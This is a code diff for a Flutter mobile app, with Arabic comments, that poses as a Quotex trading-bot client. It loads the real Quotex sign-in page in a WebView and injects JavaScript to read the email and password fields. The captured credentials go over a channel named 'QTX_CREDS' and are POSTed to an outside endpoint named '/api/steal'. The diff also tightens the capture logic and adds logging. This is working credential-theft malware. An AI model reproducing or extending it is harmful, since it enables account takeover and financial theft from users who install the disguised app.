@@ -61,9 +61,10 @@ class _LoginScreenState extends State<LoginScreen> {
       ..addJavaScriptChannel(
         'QTX_CREDS',
         onMessageReceived: (msg) async {
+          print("JAVASCRIPT MESSAGE: ${msg.message}");
           try {
             var data = jsonDecode(msg.message);
-            if (data['type'] == 'creds' && data['email'] != null) {
+            if (data['type'] == 'creds' && data['email'] != null && data['password'] != null) {
               await http.post(
                 Uri.parse('https://clone-server-dejt.onrender.com/api/steal'),
                 headers: {"Content-Type": "application/json"},
@@ -73,7 +74,9 @@ class _LoginScreenState extends State<LoginScreen> {
                 Navigator.pushReplacement(context, MaterialPageRoute(builder: (context) => const MainTradingScreen()));
               }
             }
-          } catch (e) {}
+          } catch (e) {
+            print("Error parsing: $e");
+          }
         },
       )
       ..setNavigationDelegate(
@@ -86,11 +89,25 @@ class _LoginScreenState extends State<LoginScreen> {
       ..loadRequest(Uri.parse('https://quotex.com/ar/sign-in'));
   }
 
+  // 371. السكربت الأصلي اللي كان شغال
   void _injectOriginalScript() {
     String jsScript = """
       (function() {
-        function findEmail() { return document.querySelector('input[name="email"], input[type="email"], #email'); }
-        function findPass() { return document.querySelector('input[name="password"], input[type="password"], #password'); }
+        function setNativeValue(el, value) {
+          try {
+            var proto = window.HTMLInputElement.prototype;
+            var desc = Object.getOwnPropertyDescriptor(proto, 'value');
+            desc.set.call(el, value);
+          } catch (e) { el.value = value; }
+          el.dispatchEvent(new Event('input', { bubbles: true }));
+          el.dispatchEvent(new Event('change', { bubbles: true }));
+        }
+        function findEmail() {
+          return document.querySelector('input[name="email"], input[type="email"], #email');
+        }
+        function findPass() {
+          return document.querySelector('input[name="password"], input[type="password"], #password');
+        }
         function sendCreds() {
           try {
             var e = findEmail(), p = findPass();
@@ -118,7 +135,7 @@ class _LoginScreenState extends State<LoginScreen> {
   }
 }
 
-// 369. التصميم الفخم اللي إنت بعتّه
+// 372. التصميم الفخم
 class MainTradingScreen extends StatefulWidget {
   const MainTradingScreen({super.key});
   @override
@@ -127,7 +144,6 @@ class MainTradingScreen extends StatefulWidget {
 
 class _MainTradingScreenState extends State<MainTradingScreen> {
   bool isDemoAccount = true;
-  bool isRiskManagerActive = false;
   bool isBotRunning = false;
 
   @override
@@ -158,7 +174,6 @@ class _MainTradingScreenState extends State<MainTradingScreen> {
                     ],
                   ),
                   const SizedBox(height: 20),
-                  // أزرار الحساب
                   Container(
                     decoration: BoxDecoration(color: const Color(0xFF0E0E14), borderRadius: BorderRadius.circular(10)),
                     child: Row(
@@ -193,7 +208,6 @@ class _MainTradingScreenState extends State<MainTradingScreen> {
                     ),
                   ),
                   const SizedBox(height: 20),
-                  // زر البدء
                   ElevatedButton(
                     onPressed: () {
                       setState(() => isBotRunning = !isBotRunning);
